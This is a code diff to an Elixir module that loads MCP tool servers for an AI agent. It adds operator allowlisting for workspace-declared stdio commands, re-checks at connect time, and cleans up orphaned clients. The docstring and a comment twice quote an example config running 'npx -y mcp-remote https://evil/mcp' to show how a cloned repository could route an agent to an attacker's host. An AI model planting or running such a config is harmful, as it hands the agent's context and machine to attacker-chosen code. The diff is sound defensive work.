@@ -38,6 +38,22 @@ defmodule Raxol.Agent.McpBundle do
   `${env:}` or `op://` reference unless the operator allowlisted it, also
   outside the workspace. Either refusal skips that server like any other load
   failure.
+
+  A stdio spec is gated on the same allowlist, because a `command` entry in a
+  workspace `.mcp.json` is arbitrary local code that a clone carried, and
+  `{"command": "npx", "args": ["-y", "mcp-remote", "https://evil/mcp"]}`
+  reaches a repository-chosen host over stdio whatever the host allowlist
+  says. The rule, in one sentence: a spec DECLARED `source: :workspace` may
+  only run a command the operator listed in `~/.raxol/mcp_hosts.json`, while
+  a `:user` spec and an untagged one may run anything -- an untagged spec was
+  assembled in code (`default_servers/1`, an embedder's own list), and every
+  spec parsed out of repository content is tagged by
+  `Raxol.Agent.Code.McpConfig`.
+
+  Both gates travel with the spec to the client as `:source` and `:permit`,
+  so `Raxol.MCP.Client.Transport`'s `connect/1` -- the function that opens
+  the socket or spawns the subprocess -- asks again rather than trusting that
+  it was asked here.
   """
 
   require Logger
@@ -145,18 +161,45 @@ defmodule Raxol.Agent.McpBundle do
   defp start_client(spec, start) do
     case transport(spec) do
       :stdio ->
-        guarded(start,
-          name: spec_name(spec),
-          command: Map.fetch!(spec, :command),
-          args: Map.get(spec, :args, []),
-          env: Map.get(spec, :env, [])
-        )
+        start_stdio(spec, start)
 
       :remote ->
         start_remote(spec, start)
 
       {:invalid, why} ->
         {:error, {:invalid_spec, %{name: spec_name(spec), reason: why}}}
+    end
+  end
+
+  # The stdio half of the workspace gate. A `command` entry in `.mcp.json` is
+  # arbitrary local code from a file a clone can carry, and it reaches the
+  # same tools-list-into-context result the host allowlist refuses --
+  # `{"command": "npx", "args": ["-y", "mcp-remote", "https://evil/mcp"]}` --
+  # plus everything else a binary can do. So a workspace-declared command
+  # needs the operator's allow, from the same file outside the workspace that
+  # names allowed hosts.
+  #
+  # Provenance here is what the spec DECLARES, and only `:workspace` is
+  # gated. That differs from the remote default below, deliberately: every
+  # spec parsed out of a repository is tagged `:workspace` by
+  # `Raxol.Agent.Code.McpConfig` and keeps that tag through
+  # `Raxol.Agent.Code.McpLoader`, while an UNTAGGED spec was assembled in
+  # code -- the pinned `default_servers/1` catalog, or an embedder's own list
+  # -- which is the operator's own program rather than repository content.
+  defp start_stdio(spec, start) do
+    name = spec_name(spec)
+    source = Map.get(spec, :source, :user)
+    command = Map.fetch!(spec, :command)
+
+    with :ok <- McpHosts.permit_command(command, source: source, server: name) do
+      guarded(start,
+        name: name,
+        command: command,
+        args: Map.get(spec, :args, []),
+        env: Map.get(spec, :env, []),
+        source: source,
+        permit: &McpHosts.permit_command(&1, source: source, server: name)
+      )
     end
   end
 
@@ -198,6 +241,11 @@ defmodule Raxol.Agent.McpBundle do
   # Headers are then resolved HERE, once, at connect time: the client never
   # sees a reference and never resolves one. A refusal carries the header
   # name and a classified reason, never a resolved value.
+  #
+  # The gate travels WITH the spec as well as running here, because this
+  # function is not where the socket is opened. `Raxol.MCP.Client.Transport`
+  # re-asks it inside `connect/1`, which is the function that performs the
+  # side effect and the one a future caller could reach directly.
   defp start_remote(spec, start) do
     name = spec_name(spec)
     source = Map.get(spec, :source, :workspace)
@@ -205,7 +253,7 @@ defmodule Raxol.Agent.McpBundle do
 
     with :ok <- McpHosts.permit(Map.get(spec, :url), source: source, server: name),
          {:ok, resolved} <- McpHeaders.resolve(headers, source: source, server: name) do
-      guarded(start, remote_opts(spec, name, resolved))
+      guarded(start, remote_opts(spec, name, resolved, source))
     end
   end
 
@@ -213,13 +261,15 @@ defmodule Raxol.Agent.McpBundle do
   # the hook makes the reservation and the transport enforces it, and a
   # transport that never learned the prices cannot refuse an unmetered call on
   # the path that bypasses the hook.
-  defp remote_opts(spec, name, headers) do
+  defp remote_opts(spec, name, headers, source) do
     opts = [
       name: name,
       url: Map.fetch!(spec, :url),
       headers: headers,
       metered: Map.get(spec, :metered, false),
-      prices: Map.get(spec, :prices, %{})
+      prices: Map.get(spec, :prices, %{}),
+      source: source,
+      permit: &McpHosts.permit(&1, source: source, server: name)
     ]
 
     case Map.get(spec, :concurrency) do
@@ -231,16 +281,27 @@ defmodule Raxol.Agent.McpBundle do
   defp resolve({:ok, server}, name, deadline, interval, spec) do
     case poll_tools(server, name, deadline, interval, spec) do
       {:ok, tools} -> {:ok, server, tools}
-      {:error, _} = err -> err
+      {:error, _} = err -> stop_client(server, err)
     end
   end
 
   defp resolve({:error, _} = err, _name, _deadline, _interval, _spec), do: err
 
-  # Retry listing tools while the client is still initializing, until ready or
-  # the shared deadline. Any non-`:not_ready` error fails open immediately. A
-  # server's own `:sensitive` flag (default true) is stamped onto its tools so
-  # the ToolConverter authorizer gates them appropriately.
+  # Giving up on a server must not leave one running. A client is a live
+  # process that retries its own connect on a backoff, so a skipped server
+  # whose client stayed up kept dialling its origin every <= 60 s for the rest
+  # of the session, with no tools to show for it and nothing holding the pid:
+  # an orphan the bundle had already reported as absent.
+  defp stop_client(server, err) do
+    Raxol.MCP.Client.stop(server)
+    err
+  catch
+    :exit, _already_gone -> err
+  end
+
+  # Retry listing tools until the client is ready or the shared deadline
+  # passes. A server's own `:sensitive` flag (default true) is stamped onto
+  # its tools so the ToolConverter authorizer gates them appropriately.
   defp poll_tools(server, name, deadline, interval, spec) do
     sensitive = Map.get(spec, :sensitive, true)
 
@@ -248,29 +309,40 @@ defmodule Raxol.Agent.McpBundle do
       {:ok, tools} ->
         {:ok, meter(tools, spec)}
 
-      # Only `:starting`/`:initializing` are transient; a `:closed` server has
-      # exited and will never become ready, so fail open at once rather than
-      # burning the whole budget on a dead port.
-      {:error, {:not_ready, status}} = err
-      when status in [:starting, :initializing] ->
-        if System.monotonic_time(:millisecond) < deadline do
+      {:error, reason} = err ->
+        if transient?(reason) and System.monotonic_time(:millisecond) < deadline do
           Process.sleep(interval)
           poll_tools(server, name, deadline, interval, spec)
         else
           err
         end
-
-      {:error, _} = err ->
-        err
     end
   end
 
+  # `:closed` and a failed connect are transient too, and treating them as
+  # terminal was half a state. The client schedules its own reconnect with
+  # backoff and keeps the pid, so a boot-time DNS blip used to yield a server
+  # reported as skipped whose client then reached `:ready` and was never
+  # re-listed. Awaiting it within the SHARED deadline costs no more than one
+  # slow server already costs, and `resolve/5` stops the client for the one
+  # that never arrives.
+  defp transient?({:not_ready, status}) when status in [:starting, :initializing, :closed],
+    do: true
+
+  defp transient?({:connect_failed, _reason}), do: true
+  defp transient?(_terminal), do: false
+
   # A client that crashed after start_link (a missing npx/uvx binary dies in
   # handle_continue, past the start return) makes the listing call EXIT with
-  # :noproc rather than return an error. Absorb it so fail-open stays
-  # per-server instead of taking the whole bundle load down.
+  # :noproc rather than return an error. A hostile `tools/list` shape can also
+  # RAISE while it is being wrapped. Absorb both so fail-open stays per
+  # server: one server must not be able to drop every other server's tools,
+  # which is what an escaping exit or exception did at `McpLoader.load/2`'s
+  # outer catch.
   defp list_tools(server, name, sensitive) do
     Dynamic.from_client(server, name, sensitive: sensitive)
+  rescue
+    error -> {:error, {:invalid_tools, error.__struct__}}
   catch
     :exit, reason -> {:error, {:client_down, reason}}
   end
